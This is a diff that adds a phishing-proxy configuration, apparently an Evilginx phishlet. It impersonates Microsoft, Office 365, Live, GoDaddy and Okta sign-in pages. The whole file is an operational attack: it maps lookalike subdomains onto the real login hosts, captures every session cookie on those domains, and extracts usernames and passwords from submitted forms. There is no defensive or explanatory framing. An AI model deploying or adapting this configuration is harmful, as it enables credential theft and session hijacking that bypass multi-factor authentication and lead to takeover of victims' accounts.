@@ -1,1 +1,79 @@
+min_ver: '3.0.0'
+proxy_hosts:
+#   - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
+#   - {phish_sub: 'logging', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+#   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: false}
+#   - {phish_sub: 'www1', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false}
+#  # - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: false}
+#   - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+#   - {phish_sub: 'device', orig_sub: 'device', domain: 'live.com', session: true, is_landing: false}
+#   - {phish_sub: 'accounts', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
+#   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+#   - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false}
+#   - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true }
+#   - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true }
+#   - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: true }
 
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true }
+ # - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false,  auto_filter: true }
+  - { phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true }
+  - { phish_sub: 'reporting', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: true }
+  - { phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: true }
+  - { phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'apm.vpce.gdw55e', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'g.sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "ok", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "okta", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: true }
+
+
+# sub_filters:
+#   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+#   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+#   # Uncomment and fill in if your target organization utilizes ADFS
+  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+#  - domain: '.login.microsoftonline.com'
+#    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.live.com'
+    keys: ['.*:regexp']
+  - domain: 'login.live.com'
+    keys: ['.*:regexp']
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*:regexp']
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+  - domain: 'microsoft.com'
+    keys: ['.*:regexp']
+  - domain: '.office.com'
+    keys: ['.*:regexp']
+  - domain: 'office.com'
+    keys: ['.*:regexp']
+  - domain: 'www.office.com'
+    keys: ['.*:regexp']
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.live.com'
+  path: '/'
+auth_urls:
+  - '/complete-client-signin-oauth'
